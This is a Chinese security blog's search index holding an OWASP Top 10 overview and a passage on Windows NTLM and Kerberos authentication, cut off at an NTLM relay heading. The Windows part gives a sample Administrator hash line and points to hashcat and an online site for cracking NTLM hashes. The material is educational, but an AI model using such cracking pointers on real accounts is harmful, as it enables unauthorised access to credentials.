<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/post/hello-world/"/>
    <url>/post/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>OWASP 学习笔记</title>
    <link href="/post/OWASP%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/post/OWASP%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>再次学习 OWASP，本文仅仅作为一个概述，详细的内容以后有时间会慢慢补充。</p><h3 id="0x00-十项最严重的-Web-应用程序安全风险-2017"><a href="#0x00-十项最严重的-Web-应用程序安全风险-2017" class="headerlink" title="0x00 十项最严重的 Web 应用程序安全风险 - 2017"></a>0x00 十项最严重的 Web 应用程序安全风险 - 2017</h3><p>1、TOP 1  注入<br>2、TOP 2  失效的身份认证<br>3、TOP 3  敏感数据泄漏<br>4、TOP 4  XML 外部实体<br>5、TOP 5  失效的访问控制<br>6、TOP 6  安全配置错误<br>7、TOP 7  XSS 跨站脚本<br>8、TOP 8  不安全的反序列化<br>9、TOP 9  使用含有已知漏洞的组件<br>10、TOP 10  不足的日志记录和监控</p><span id="more"></span><h3 id="0x01-注入"><a href="#0x01-注入" class="headerlink" title="0x01 注入"></a>0x01 注入</h3><p>将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如 SQL 注入、NoSQL 注入、OS 注入和 LDAP 注入的注入缺陷，攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p><p><strong>威胁来源</strong></p><p>注入漏洞十分普遍，且很容易通过代码审查发现，扫描器和模糊测试工具都可以帮助攻击者找到这些漏洞。而且几乎任何数据源都能成为注入载体，包括环境变量、所有类型的用户、参数、外部和内部 Web 服务，当攻击者可以向解释器发送恶意数据时，就会产生注入漏洞。</p><p><strong>影响</strong></p><p>注入可能导致数据丢失、破坏或泄露给无授权方，使服务器缺乏可审计性或是拒绝服务，有时甚至能导致服务器被完全接管。</p><p><strong>防范</strong></p><p>防止注入漏洞的核心是要将数据与命令语句、查询语句分隔开，代码审计是最有效的检测应用程序的注入风险的办法之一，其次可以：</p><ul><li>使用安全的 API，避免完全使用解释器；</li><li>在服务器使用“白名单”规范化用户输入；</li><li>使用解释器转义语法转义特殊字符；</li><li>在查询中使用 LIMIT 和其他 SQL 控件，以防止在 SQL 注入时大量泄露记录。</li></ul><h3 id="0x02-失效的身份认证"><a href="#0x02-失效的身份认证" class="headerlink" title="0x02 失效的身份认证"></a>0x02 失效的身份认证</h3><p>通过不正确地使用应用程序的身份认证和会话管理功能，导致攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p><p><strong>威胁来源</strong></p><p>攻击者可以获得数百万的有效用户名和密码组合，包括大量溢出的凭据、默认的管理帐户列表、自动的暴力破解和字典攻击工具，以及高级的 GPU 破解工具，攻击者也可以结合社会工程学，发现失效的身份验证并利用。</p><p><strong>影响</strong></p><p>攻击者只需要访问几个帐户，或者只需要一个管理员帐户就可以破坏我们的系统。根据应用程序领域的不同，可能会导致放任洗钱、社会安全欺诈、用户身份盗窃、泄露法律高度保护的敏感信息等。</p><p><strong>防范</strong></p><ul><li>在可能的情况下，实现多因素身份验证 ；</li><li>不要使用默认的凭证，特别是管理员用户；</li><li>执行弱密码检测，使密码长度、复杂性符合安全策略；</li><li>限制或逐渐延迟失败的登录尝试，记录所有失败信息；</li><li>使用服务器端内置的会话管理器，在登录后生成高度复杂的新随机会话 ID，会话 ID 不能在 URL 中；</li><li>当用户不活跃时，及时使用户会话或认证令牌失效。</li></ul><h3 id="0x03-敏感数据泄漏"><a href="#0x03-敏感数据泄漏" class="headerlink" title="0x03 敏感数据泄漏"></a>0x03 敏感数据泄漏</h3><p>许多 Web 应用程序和 API 都无法正确保护敏感数据，为抵御攻击者我们需要对敏感数据加密，这些数据包括传输过程中的数据、存储的数据以及浏览器交互过程中的数据。</p><p><strong>威胁来源</strong></p><p>攻击者不是直接攻击密码，而是在传输过程中或从客户端（如浏览器）窃取密钥，发起中间人攻击，或从服务器端窃取明文数据。最常见的漏洞是对敏感信息不进行加密，或者在数据加密过程中使用不安全的密钥生成和管理机制，以及使用弱加密算法、弱协议和弱密码。</p><p><strong>影响</strong></p><p>敏感数据泄漏，通常包括很多个人敏感信息（PII），如：医疗记录、认证凭证、个人隐私、信用卡信息等，攻击者可以通过窃取或修改未加密的数据实施信用卡诈骗、身份盗窃或其他犯罪行为。</p><p><strong>防范</strong></p><p>对一些需要加密的敏感数据，至少应该做到以下几点：</p><ul><li>对系统处理、存储或传输的数据进行分类，并根据分类进行访问控制；</li><li>熟悉与敏感数据保护相关的法律和条例，并根据每项法规要求保护敏感数据；</li><li>对于没必要存放的、重要的敏感数据，应当尽快清除；</li><li>确保存储的所有敏感数据被加密；</li><li>确保传输过程中的数据被加密，如使用 HSTS（使用HTTP严格安全传输协议）；</li><li>确保使用了专用的算法存储密码，如使用 scrypt、bcrypt 或者 PBKDF2；</li><li>确保使用了最新的、强大的标准算法或密码、参数、协议和密匙，并且保证密钥管理安全；</li><li>禁止缓存对包含敏感数据的响应；</li><li>单独验证每个安全配置项的有效性。</li></ul><h3 id="0x04-XML-外部实体"><a href="#0x04-XML-外部实体" class="headerlink" title="0x04 XML 外部实体"></a>0x04 XML 外部实体</h3><p>许多较早的或配置错误的 XML 处理器使用了 XML 文件中的外部实体引用，攻击者可以利用外部实体窃取使用 URI 文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p><p><strong>威胁来源</strong></p><p>大量 XXE 缺陷已经被发现并被公开，这些缺陷包括嵌入式设备的 XXE 缺陷、深嵌套的依赖项或集成，如果攻击者可以上传 XML 文档或者在 XML 文档中添加恶意内容，他们就能够攻击含有缺陷的 XML 处理器。</p><p><strong>影响</strong></p><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站、发起拒绝服务攻击等危害。</p><p><strong>防范</strong></p><p>对开发人员进行安全培训是识别和减少 XXE 缺陷的关键，此外，防止 XXE 缺陷还需要： </p><ul><li>尽可能使用简单的数据格式（如 JSON），避免对敏感数据进行序列化；</li><li>及时修复或更新应用程序和底层操作系统使用的所有 XML 处理器和库；</li><li>在应用程序的所有 XML 解析器中禁用 XML 外部实体和 DTD 进程；</li><li>在服务端使用“白名单”对输入进行验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据；</li><li>验证 XML 或 XSL 文件上传功能是否使用 XSD 或其他方法来验证上传的 XML 文件；</li><li>使用 SAST 工具检测源代码中的 XXE 漏洞；</li><li>使用虚拟修复程序、API 安全网关或 WAF 来检测、监控和防止 XXE 攻击。</li></ul><h3 id="0x05-失效的访问控制"><a href="#0x05-失效的访问控制" class="headerlink" title="0x05 失效的访问控制"></a>0x05 失效的访问控制</h3><p>由于未对通过身份验证的用户实施恰当的访问控制，攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p><p><strong>威胁来源</strong></p><p>对访问控制的利用是渗透测试人员的一项核心技能，使用 SAST（静态应用程序安全性测试） 工具和 DAST（动态应用程序安全性测试）工具可以检测到访问控制的缺失，但不能验证其功能是否正常。</p><p><strong>影响</strong></p><p>攻击者可以冒充用户、管理员或拥有特权的用户，或者创建、 访问、更新或删除任何记录。</p><p><strong>防范</strong></p><p>访问控制只有在受信服务端代码或没有服务器的 API 中有效， 这样攻击者才无法修改访问控制检查或元数据。</p><ul><li>除公有资源外，其他资源默认情况下拒绝访问；</li><li>使用一次性的访问控制机制，并在整个应用程序中不断重用它们，包括最小化 CORS 使用；</li><li>禁用 Web 服务器目录列表，并确保文件元数据不存在于 Web 的根目录中；</li><li>记录失败的访问请求，并在适当时向管理员告警；</li><li>对 API 和服务器的访问进行速率限制，以最大限度地降低自动化攻击工具的危害；</li><li>当用户注销后，服务器上的 JWT（JSON Web Token）令牌应失效。</li></ul><h3 id="0x06-安全配置错误"><a href="#0x06-安全配置错误" class="headerlink" title="0x06 安全配置错误"></a>0x06 安全配置错误</h3><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 头部配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p><p><strong>威胁来源</strong></p><p>安全配置错误可以发生在一个应用程序的任何层面，包括网络服务、平台、Web 服务器、应用服务器、数据库、框架、自定义代码和预安装的虚拟机、容器和存储等。通常，攻击者能够通过未修复的漏洞、默认账户、不再使用的页面、未受保护的文件和目录等来取得对系统的未授权访问或了解。</p><p><strong>影响</strong></p><p>这些漏洞使攻击者能访问一些未授权的系统数据或功能，严重的时候可能会导致系统被完全攻破。 </p><p><strong>防范</strong></p><p>应实施安全的应用部署过程，包括： </p><ul><li>搭建最小化平台，该平台不包含任何不必要的功能、组件、文档和示例，移除或不安装不适用的功能和框架；</li><li>检查和修复安全配置项来适应最新的安全说明、更新和补丁，并将其作为更新管理过程的一部分，特别注意云存储权限；</li><li>使用能在组件和用户间提供有效的分离和安全性的分段应用程序架构，包括：分段、容器化和云安全组；</li><li>使用 HTTP 安全头部向客户端发送指令；</li><li>在所有环境中能够进行正确并自动化的安全配置。</li></ul><h3 id="0x07-XSS-跨站脚本"><a href="#0x07-XSS-跨站脚本" class="headerlink" title="0x07 XSS 跨站脚本"></a>0x07 XSS 跨站脚本</h3><p>当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML 或 JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本、劫持用户会话、破坏网站或将用户重定向到恶意站点。</p><p><strong>威胁来源</strong></p><p>XSS 是 OWASP Top10 中第二普遍的安全问题，存在于近三分之二的应用中，自动化工具能够检测并利用所有三种形式的 XSS ，并且存在方便攻击者利用漏洞的框架。 </p><p><strong>影响</strong></p><p>反射型 XSS 和 DOM 型 XSS 的影响是中等的，而存储型 XSS 的影响更为严重，如可以在受害者的浏览器上执行远程代码、窃取凭证和会话记录或传递恶意软件等。</p><p><strong>防范</strong></p><p>防止 XSS 需要将不可信数据与动态的浏览器内容区分开：</p><ul><li>使用从设计上就会自动编码来解决 XSS 问题的框架，如 Ruby 3.0 或 React JS；</li><li>为了避免反射式或存储式的 XSS 漏洞，最好的办法是根据 HTML 输出的上下文对所有不可信的 HTTP 请求数据进行恰当的转义；</li><li>在客户端修改浏览器文档时，为了避免 DOM XSS 攻击，最好的选择是实施上下文敏感数据编码；</li><li>对抗 XSS 的深度防御策略是使用 CSP 内容安全策略。</li></ul><h3 id="0x08-不安全的反序列化"><a href="#0x08-不安全的反序列化" class="headerlink" title="0x08 不安全的反序列化"></a>0x08 不安全的反序列化</h3><p>不安全的反序列化会导致远程代码执行，即使有些反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行重放攻击、注入攻击和特权升级攻击等。</p><p><strong>威胁来源</strong></p><p>对反序列化的利用比较困难，因为在不更改或调整底层可被利用代码的情况下，现成的反序列化漏洞很难被使用。有些工具可以被用于发现反序列化缺陷，但仍需要人工帮助来验证发现的问题。</p><p><strong>影响</strong></p><p>反序列化缺陷的影响不能被低估，它可能导致远程代码执行攻击，这是可能发生的最严重的攻击之一。</p><p><strong>防范</strong></p><p>唯一安全的架构模式是不接受来自不受信源的序列化对象，或使用只允许原始数据类型的序列化媒体，其次可以：</p><ul><li>执行完整性检查，如对任何序列化对象进行数字签名，以防止恶意用户创建或篡改数据；</li><li>在创建对象之前强制执行严格的类型约束，但是绕过这种技术的方法已经被证明，完全依赖于它并不可取；</li><li>如果可能，隔离运行那些在低特权环境中反序列化的代码；</li><li>记录反序列化的例外情况和失败信息，如传入的类型不是预期的类型，或者反序列处理引发的例外情况；</li><li>限制或监视来自于容器或服务器传入和传出的反序列化网络连接；</li><li>监控反序列化，当用户持续进行反序列化时，对用户进行警告。</li></ul><h3 id="0x09-使用含有已知漏洞的组件"><a href="#0x09-使用含有已知漏洞的组件" class="headerlink" title="0x09 使用含有已知漏洞的组件"></a>0x09 使用含有已知漏洞的组件</h3><p>如果应用程序中含有已知漏洞的组件，则有可能被攻击者利用，会造成严重的数据丢失或服务器接管。</p><p><strong>威胁来源</strong></p><p>很多时候组件都是以与应用相同的权限运行的，这使得组件里的缺陷可能导致各式各样的问题，这些缺陷可能是偶然的，比如编码错误，也可能是蓄意的，比如软件后门。对一些漏洞而言很容易找到其利用程序，对于某些漏洞则需要定制开发。</p><p><strong>影响</strong></p><p>虽然对于一些已知的漏洞其影响很小，但目前很多严重的安全事件都是利用组件中的已知漏洞，根据你所要保护的资产，此类风险等级可能会很高。</p><p><strong>防范</strong></p><p>应该制定一个补丁管理流程：</p><ul><li>移除不使用的依赖、不需要的功能、组件、文件和文档；</li><li>利用工具持续记录客户端和服务端所依赖库的版本信息，订阅关于所使用组件安全漏洞的警告邮件，并监控如 CVE 和 NVD 等是否发布已使用组件的漏洞信息，可以使用软件分析工具来自动完成此功能；</li><li>仅从官方渠道安全的获取组件，并使用签名机制来降低组件被篡改或加入恶意漏洞的风险；</li><li>监控那些不再维护或者不发布安全补丁的库和组件；</li><li>如果不能打补丁，可以考虑部署虚拟补丁来监控、检测或保护。 </li><li>每个组织都应该制定相应的计划，对整个软件生命周期进行监控、评审、升级或更改配置。</li></ul><h3 id="0x10-不足的日志记录和监控"><a href="#0x10-不足的日志记录和监控" class="headerlink" title="0x10 不足的日志记录和监控"></a>0x10 不足的日志记录和监控</h3><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间在 200 天之后，且通常是外部检测方检测到的，而不是通过内部流程或监控检测。</p><p><strong>威胁来源</strong></p><p>对不足的日志记录和监控的利用几乎是每一个重大安全事件的温床，攻击者依靠监控的不足和响应的不及时来达成他们的目标而不被知晓。</p><p><strong>影响</strong></p><p>多数成功的攻击往往从漏洞探测开始，允许这种探测将会大大提高攻击者攻击成功的可能性。</p><p><strong>防范</strong></p><p>根据应用程序存储或处理的数据的风险：</p><ul><li>确保所有登录、访问控制失败、输入验证失败都能被记录到日志中去，并保留足够的用户上下文信息，以识别可疑账户或恶意帐户，并为后期取证预留足够的信息；</li><li>确保日志以一种能被集中管理的形式生成； </li><li>确保高额交易有完整性控制的审计信息，以防止被篡改或删除；</li><li>建立有效的监控和告警机制，使可疑活动在可接受的时间内被即使发现和应对； </li><li>建立或采取一个应急响应机制和恢复计划。</li></ul><p><strong>参考文章：</strong><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf">OWASP Top 10 2017.pdf</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>concept</tag>
      
      <tag>Web</tag>
      
      <tag>OWASP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网信息搜集思路</title>
    <link href="/post/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/"/>
    <url>/post/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/</url>
    
    <content type="html"><![CDATA[<p>常见的内网信息搜集目标和信息搜集思路，如下图所示：</p><p><img src="/img/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E6%80%9D%E8%B7%AF/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86.png" alt="内网信息搜集"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
      <tag>OWASP</tag>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Windows 安全认证机制探究</title>
    <link href="/post/Windows%20%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/"/>
    <url>/post/Windows%20%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h3><p>Windows 身份认证有 NTLM 和 Kerberos 两种协议，前者主要应用于 Windows NT 和 Windows 2000 Server 及之后的工作组环境，而后者则主要应用于 Windows 2000 Server 及之后的域环境。NTLM 是 Windows 早期版本的标准安全协议，认证过程相对简单；而 Kerberos 较之 NTLM 更高效、更安全，同时认证过程也相对复杂。本文将围绕这两种协议，对 Windows 安全认证机制中涉及到的内容进行初步探究。</p><h3 id="0x01-Windows-Hash-类型"><a href="#0x01-Windows-Hash-类型" class="headerlink" title="0x01 Windows Hash 类型"></a>0x01 Windows Hash 类型</h3><p>Windows 系统使用两种方法对用户的密码进行哈希处理，它们分别是 LAN Manager 哈希（LM Hash）和 NT LAN  Manager 哈希（NTLM Hash）。</p><h4 id="LM-型哈希"><a href="#LM-型哈希" class="headerlink" title="LM 型哈希"></a>LM 型哈希</h4><p>LM Hash 是 Windows 系统所用的第一种密码哈希算法，它只有一个版本且一直用到了 NTLM 哈希的出现，在 Windows Vista 和 Windows Server 2008 以前的系统中使用。</p><p>LM 型哈希对一个密码的处理过程如下：</p><ol><li>将用户的明文口令全部转换成大写形式（用户口令被限制为最多14个字符）；</li><li>将口令转换为16进制字符串，不足14个字节要求在后面用0补全；</li><li>将新得到的用户口令从中间一分为二，每一半分别包含7个字节；</li><li>将每部分转换成56 bit 的比特流，长度不足56 bit 要求使用0在左边补齐长度，再分7 bit 为一组末尾加0，组成新的64 bit编码；</li><li>将上述得到的两组8字节编码，分别作为 DES 密钥加密字符串 **KGS!@#$%**，得到两个8字节的16进制密文；</li><li>将两组8字节的密文拼接，最终得到 LMHash 值。</li></ol><h4 id="NTLM-型哈希"><a href="#NTLM-型哈希" class="headerlink" title="NTLM 型哈希"></a>NTLM 型哈希</h4><p>NTLM 型哈希也被称为 <strong>NTHash</strong>，由于 IBM 设计的 LM Hash 算法存在几个弱点，因此在 Windows Vista 和 Windows Server 2008 及之后的 Windows 系统中 LM Hash 被弃用，微软在保持向后兼容性的同时提出了自己的挑战响应机制，NTLM Hash 便应运而生。NTLM Hash 以 MD4 散列算法为基础，在实现起来实际上更为简单。</p><p>NTLM 型哈希对一个密码的处理过程如下：</p><ol><li>将密码字符串转化为 ASCII 字符串（123456 -&gt; 49 50 51 52 53 54）；</li><li>将 ASCII 字符串转换为十六进制字符串（49 50 51 52 53 54 -&gt; 31 32 33 34 35 36）； </li><li>将十六进制字符串转化为 Unicode 字符串（31 32 33 34 35 36 -&gt; 310032003300340035003600）；</li><li>对 Unicode 字符串使用 MD4 散列算法，得到16字节的 NTLM Hash 值（310032003300340035003600 -&gt; 32ed87bdb5fdc5e9cba88547376818d4）。</li></ol><p>与 LM Hash 算法相比，NTLM Hash 对明文口令大小写敏感，且无法根据 NTLM Hash 判断原始明文口令是否小于8字节，摆脱了魔术字符串 KGS!@#$%。另外相较于 DES 加密，MD4 哈希算法被认为要强壮得多，因为它允许使用更长的密码，允许有大小写的不同，而且也无须把密码分割成更小、更易于被破解的块。</p><p><strong>NTLM Hash 与 Net-NTLM Hash 的区别</strong></p><p>NTLM Hash 通常是指 Windows 系统下 Security Account Manager 中保存的用户密码 hash，Net-NTLM Hash 通常是指网络环境下用于网络身份认证（例如 NTLM 认证）中的 hash，如 Net-NTLMv1 和 Net-NTLMv2。</p><h4 id="Windows-Hash-密码格式"><a href="#Windows-Hash-密码格式" class="headerlink" title="Windows  Hash 密码格式"></a>Windows  Hash 密码格式</h4><p>格式为：<code>用户名称:RID:LMHash:NTHash</code></p><blockquote><p>例如：<br>Administrator:500:C8825DB10F2590EAAAD3B435B51404EE:683020925C5D8569C23AA724774CE6CC:::</p><p>表示：<br>用户名称为：Administrator<br>RID 为：500<br>LM Hash 值为：C8825DB10F2590EAAAD3B435B51404EE<br>NTLM Hash 值为：683020925C5D8569C23AA724774CE6CC</p></blockquote><p>如果你知道某个用户的 NTLM Hash 密码了，可以使用 hashcat 进行破解，或者到 <a href="http://www.objectif-securite.ch/en/ophcrack.php">这个网站</a> 进行在线破解。</p><h4 id="Windows-下各类-HASH-比较"><a href="#Windows-下各类-HASH-比较" class="headerlink" title="Windows 下各类 HASH 比较"></a>Windows 下各类 HASH 比较</h4><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/20180715111518-4cceec08-87dd-1.png" alt="img"></p><h3 id="0x02-Windows-域和工作组"><a href="#0x02-Windows-域和工作组" class="headerlink" title="0x02 Windows 域和工作组"></a>0x02 Windows 域和工作组</h3><p>局域网上的资源需要管理，<strong>域（Domain）</strong>和<strong>工作组（Work Group）</strong>就是两种不同的网络资源管理模式，两者之间的基本区别在于资源的共享方式和管理用户的方法不同，主要根据 LAN 的规模来区别使用，Windows 计算机不能同时属于域与工作组。</p><h4 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h4><p>工作组是一群计算机的集合，它仅仅是一个逻辑的集合，组中每台计算机还是单独管理的，如果要访问其中的计算机，则需要到被访问计算机上进行用户验证，这增加了访问的复杂程度。例如想要通过工作组控制用户访问共享文件，当一台计算机设定了密码后，其他计算机每次在访问这台电脑中的共享文件时都必须输入密码。</p><p>加入工作组的方法很简单，如果在 LAN 上的计算机设置了相同的工作组名称，<strong>“网络”</strong>中就会将这些计算机将显示在同一个工作组中。你可以随便加入同一网络上的任何工作组，也可以随时退出某个工作组，只要将工作组名称改动即可。工作组就像一个可以自由加入和退出的俱乐部一样，它本身的作用仅仅是提供一个“房间”，以便同一 LAN 下的计算机可以共享资源。 </p><h4 id="域"><a href="#域" class="headerlink" title="域"></a>域</h4><p>与工作组的松散的“会员制”有所不同，域是一个相对严格的组织，是一个有<strong>安全边界</strong>的计算机集合。在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器时，不需要在访问的计算机上再次进行身份验证。</p><p>在“域”模式下，至少有一台服务器负责每一台联入网络的计算机和用户的验证工作，相当于一个单位的门卫一样，这个服务器被称为<strong>域控制器（Domain  Controller，DC）</strong>。域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息。当计算机联入网络时，域控制器首先要鉴别这台计算机是否是属于这个域的，用户使用的账号/口令是否正确，认证成功后，再访问这个域中的共享文件时就无须每次输入密码了。</p><p>关于林根域的概念具体见这篇文章：<a href="http://angerfire.blog.51cto.com/198455/144123/">图解域域树域林根域的含义</a></p><h4 id="工作组和域的区别"><a href="#工作组和域的区别" class="headerlink" title="工作组和域的区别"></a>工作组和域的区别</h4><p>域用户的帐号和密码是不在本机的，全部保存在域控制器上，而工作组中帐号和密码都保存在本地。</p><p>域和工作组适用的环境不同，<strong>域一般是用在比较大的网络里</strong>，工作组则较小。</p><p>在一个域中需要有一台域控服务器，对其他计算机的互相访问进行管理；而在工作组中所有的计算机都是对等的，也就没有了服务器和客户机之分，但是和域一样，工作组中也存在一台组控服务器（以选举的方式产生，不固定），用于存储和这个组相关的信息。如果一台计算机想访问组中其他的计算机时，首先也要找到这个组中的组控服务器，得到工作组的信息，然后继续访问。</p><h3 id="0x03-NTLM-身份认证"><a href="#0x03-NTLM-身份认证" class="headerlink" title="0x03 NTLM 身份认证"></a>0x03 NTLM 身份认证</h3><p>NTLM 是 Windows NT 早期版本的标准安全协议，为用户提供认证、完整性和机密性保障，因向后兼容而被保留下来，有 NTLMv1，NTLMv2，NTLMv2 session 三种版本。</p><h4 id="NTML-认证过程"><a href="#NTML-认证过程" class="headerlink" title="NTML 认证过程"></a>NTML 认证过程</h4><p>NTLM 是一种挑战/响应（Challenge/Response）形式的验证机制，主要包括三类消息类型：</p><ul><li><p>Type1  message：协商（negotiation）</p><p>客户端在发起认证时，首先向服务器发送协商消息。协商需要认证的主体、用户、机器以及需要使用的安全服务等信息，并通知服务器自己支持的协议内容、加密等级等。</p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-eeb88612cb73ea1f.jpg" alt="img"></p><ul><li><p>Type2  message：挑战（challenge）</p><p>服务器在收到客户端的协商消息之后，会读取其中的内容，从中选择出自己所能接受的服务内容，比如加密等级，安全服务等，并生成一个随机数 challenge，然后生成挑战消息返回给客户端。 </p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-b1a7ab377044b2fb.jpg" alt="img"></p><ul><li><p>Type3  message：认证（authentication）</p><p>客户端在收到服务器返回的 challenge 消息后，读取服务器所支持的内容和随机数 challenge，决定服务器所支持的内容是否满足自己的要求。如果满足，则使用自己的 password hash 加密 challenge， 并最终生成一个认证消息发送给服务器。 </p></li></ul><p><img src="/img/Windows%E5%AE%89%E5%85%A8%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6%E6%8E%A2%E7%A9%B6/48820-114b90a7b8f7eb32.jpg" alt="img"></p><p>下面来详细解析 NTLM 验证过程，一共分为七步：</p><ol><li>用户访问客户端计算机并提供域名（domain name）、用户名（user name）和口令（password）。在客户端计算口令的Hash值并保存在本地；</li><li>客户端（Client）将用户名发送给服务器（以明文形式）；</li><li> 服务器（Server）生成一个16字节的随机数，称为challenge或nonce，并将其发送给客户端；</li><li>客户端收到challenge后，复制一份拷贝，然后将其中一个challenge使用用户口令的单向散列（password hash）加密，之后作为response发送给服务器。这叫做响应。</li><li>服务器在收到客户端传送过来response后，将user name，challenge以及response这三份内容发送给域控制器DC。</li><li>DC在收到user name，challenge，response后，根据user name在SAM数据库（Security Account Manager database）中找到其对应的password hash，然后用这个password hash加密challenge，得到challenge-hash；</li><li>DC将它计算出的challenge-hash（步骤6）与客户端计算出的response（步骤4）进行比较。如果他们相同，则验证成功。之后DC会将验证结果发给Server，并最终返回给Client。（如果是使用本地用户身份进行认证，则由Server本身完成认证过程。）</li></ol><blockquote><p>注：在 <a href="https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm">Microsoft NTLM</a> 中提到让我们不要直接使用 NTLM，而是使用 negotiate。由于 Kerberos 的安全性要比 NTLM 更高，在 negotiate 情况下 Windows 会判断 Kerberos 是否可用，如果可用就优先使用 Kerberos，否则才会使用 NTLM。</p></blockquote><h4 id="SSPI-amp-SSP"><a href="#SSPI-amp-SSP" class="headerlink" title="SSPI &amp; SSP"></a>SSPI &amp; SSP</h4><p><strong>SSPI（Security Support Provider Interface ）</strong>是 Windows 定义的一套接口，此接口定义了与安全有关的功能函数；<strong>SSP（Security Support Provider）</strong>是 SSPI 的实现者，用于提供安全功能，比如 <strong>NTLMSSP（NTLM Security Support Provider）</strong>就为 NTLM 认证的实现提供了基本功能，类似的还有 Negotiate、Kerberos、CredSSP、DigestSSP、NegotiateSSP 等。</p><blockquote><p>注：由于 NTLMSSP 只是实现了 NTLM 认证，它并没有规定使用什么协议来进行传输。实际上 SMB、HTTP、LDAP、MSSQL 等协议都可以携带 NTLM 认证的三类消息，也就是说我们可以通过这些协议来进行攻击。</p></blockquote><h4 id="NTLM-Relay-amp-PTH"><a href="#NTLM-Relay-amp-PTH" class="headerlink" title="NTLM-Relay &amp; 